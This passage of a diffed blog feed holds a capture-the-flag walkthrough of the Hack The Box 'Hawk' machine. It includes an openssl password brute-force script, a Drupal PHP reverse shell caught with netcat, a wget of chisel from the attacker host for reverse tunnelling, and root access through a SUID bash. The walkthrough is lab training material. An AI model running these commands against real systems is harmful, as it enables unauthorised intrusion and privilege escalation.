+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; .drupal.txt.enc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;226&lt;/span&gt; Directory send OK.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ftp&amp;gt; get .drupal.txt.enc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;local: .drupal.txt.enc remote: .drupal.txt.enc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt; Entering Extended Passive Mode &lt;span style=&#34;color:#f92672&#34;&gt;(||&lt;/span&gt;|43488|&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; .drupal.txt.enc &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;100% |****************************************************************************************************|   &lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;        4.97 MiB/s    00:00 ETA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;226&lt;/span&gt; Transfer complete.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt; bytes received in 00:00 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.42 KiB/s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This turns out to be a openssl encrypted message in base64.&lt;/p&gt;
+&lt;h1 id=&#34;decrypting-the-file&#34;&gt;Decrypting the file&lt;/h1&gt;
+&lt;p&gt;With &lt;strong&gt;openssl&lt;/strong&gt; we can bruteforce the password, however there&amp;rsquo;s a variable we don&amp;rsquo;t have, the cipher format.&lt;/p&gt;
+&lt;p&gt;We could use a tool like this one which iterates through every possible cipher:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw1.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;But this would take too long so first we will go with the most common one: AES-256-CBC.&lt;/p&gt;
+&lt;p&gt;This is the script that will do the bruteforce for us:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;decryptor.sh&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+#!/bin/bash
+
+for password in $(cat /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt); do
+  openssl aes-256-cbc -d -a -in .drupal.txt.enc -out drupal.decrypted -pass pass:$password &amp;amp;&amp;gt;/dev/null
+
+  if [ &amp;#34;$(echo $?)&amp;#34; == &amp;#34;0&amp;#34; ]; then
+    echo -e &amp;#34;\n[&amp;#43;] Password: $password&amp;#34;
+    exit 0
+  fi
+done
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Parameters:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-a&lt;/code&gt;: base64 encoded content.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;: decrypt.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-in&lt;/code&gt;: input file to decrypt.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-out&lt;/code&gt;: file to output the decrypted content.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-pass&lt;/code&gt;: password to try.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ ./decryptor.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Password: friends
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The password is &lt;em&gt;friends&lt;/em&gt;, and the output of the decrypted message should be in &lt;strong&gt;drupal.decrypted&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ cat drupal.decrypted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Daniel,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Following the password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the portal:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PencilKeyboardScanner123
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please let us know when the portal is ready.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Kind Regards,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IT department
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;drupal-access&#34;&gt;Drupal access&lt;/h1&gt;
+&lt;p&gt;This credentials may be useful with the Drupal website:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw5.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw6.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Nice.&lt;/p&gt;
+&lt;h1 id=&#34;command-execution&#34;&gt;Command execution&lt;/h1&gt;
+&lt;p&gt;From a Drupal admin panel there&amp;rsquo;s a common way to get command execution by creating an article with php code.&lt;/p&gt;
+&lt;p&gt;But first we have to enable the PHP filter inside the Modules:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw7.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Now inside &lt;strong&gt;Content&lt;/strong&gt; we can create a new article and write php code to send a reverse shell:&lt;/p&gt;
+&lt;p&gt;
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw8.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw9.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw10.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;Now once we save the article we should get the connection to our netcat:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection from 192.168.10.21:43348
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Version 7.92 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Listening on :::334
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Listening on 0.0.0.0:334
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Connection from 10.129.95.193.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ncat: Connection from 10.129.95.193:48998.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash: cannot set terminal process group &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;993&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; device
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash: no job control in this shell
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/var/www/html$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Perfect, however, we have a shell not a tty so let&amp;rsquo;s get one:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/var/www/html$  script /dev/null -c bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;script /dev/null -c bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Script started, file is /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/var/www/html$ ^Z
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;zsh: suspended  nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ stty raw -echo; fg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;  + continued  nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;334&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                              reset xterm
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And lastly some final touches like the screen size (you can get yours doing &lt;code&gt;stty size&lt;/code&gt;):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/var/www/html$ export TERM&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;xterm
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/var/www/html$ export SHELL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/var/www/html$ stty rows &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; columns &lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inside daniel&amp;rsquo;s home directory we can see the user flag:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/home/daniel$ ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/home/daniel$ cat user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;17f10ee16b5094******************
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now let&amp;rsquo;s work our way to the &lt;strong&gt;root.txt&lt;/strong&gt;:&lt;/p&gt;
+&lt;h1 id=&#34;privesc&#34;&gt;&lt;strong&gt;&lt;code&gt;Privesc&lt;/code&gt;&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;Now that we are inside the machine we can access the H2 database:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw11.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;h1 id=&#34;port-forwarding&#34;&gt;Port forwarding&lt;/h1&gt;
+&lt;p&gt;With chisel we can forward port 8082 and access this port as if we were the victim machine itself:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/tmp$ wget http://10.10.14.161/chisel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--2022-07-12 02:29:07--  http://10.10.14.161/chisel
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.10.14.161:80... connected.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP request sent, awaiting response... &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;3107968&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3.0M&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;application/octet-stream&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Saving to: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chisel&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chisel                               100%&lt;span style=&#34;color:#f92672&#34;&gt;[===================================================================&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;   2.96M  1.24MB/s    in 2.4s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022-07-12 02:29:09 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.24 MB/s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chisel&amp;#39;&lt;/span&gt; saved &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;3107968/3107968&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/tmp$ chmod +x chisel
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Chisel works by setting a server in our host and a client in the victim machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/tmp$ ./chisel client 10.10.14.161:1234 R:8082:127.0.0.1:8082
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022/07/12 02:32:20 client: Connecting to ws://10.10.14.161:1234
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022/07/12 02:32:21 client: Connected &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Latency 181.20864ms&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;❯ ./chiselarm server --reverse -p &lt;span style=&#34;color:#ae81ff&#34;&gt;1234&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022/07/11 21:32:06 server: Reverse tunnelling enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022/07/11 21:32:06 server: Fingerprint S/iD0MdHTYM8JBxXVa+NZsTLoOEph5iHQ4zIKeNiMAw&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022/07/11 21:32:06 server: Listening on http://0.0.0.0:1234
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022/07/11 21:32:22 server: session#1: tun: proxy#R:8082&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;8082: Listening
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now if we go to our localhost in port 8082 we should have access to the database:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw12.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;In the Preferences panel we can allow access from other hosts:
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw13.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;If we try to connect we get an error:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw14.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;We can quicly solve this by changing the database name:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw15.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The user running the server is root:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw16.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;So if we get command execution it will be as root.&lt;/p&gt;
+&lt;p&gt;After some research we find this:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw17.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s see if it works by trying to execute &lt;strong&gt;id&lt;/strong&gt;:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw18.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;It works!&lt;/p&gt;
+&lt;p&gt;As root is the one executing this, we can change the &lt;strong&gt;/bin/bash&lt;/strong&gt; privileges to SUID and get access as root:&lt;/p&gt;
+
+  &lt;img src=&#34;https://theloganlab.github.io/img/haw19.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/tmp$ ls -la /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;1113504&lt;/span&gt; Apr  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2018&lt;/span&gt; /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now with parameter &lt;strong&gt;-p&lt;/strong&gt; we will spawn a bash as the owner, &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;www-data@hawk:/tmp$ bash -p
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-4.4# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nice, inside root&amp;rsquo;s folder we can find the root.txt:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-4.4# cat /root/root.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;65f3dee5beae82******************
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See you next time!&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>HTB: RouterSpace</title>
       <link>https://theloganlab.github.io/posts/routerspace/</link>
@@ -1073,7 +1458,7 @@ If the folder containing the .scf file is opened with File Explorer, the .scf wi
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*Evil-WinRM* PS C:sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; type root.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192c8e9fba8ecc1c92901f2bd9892084
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192c8e9fba8ecc1*****************
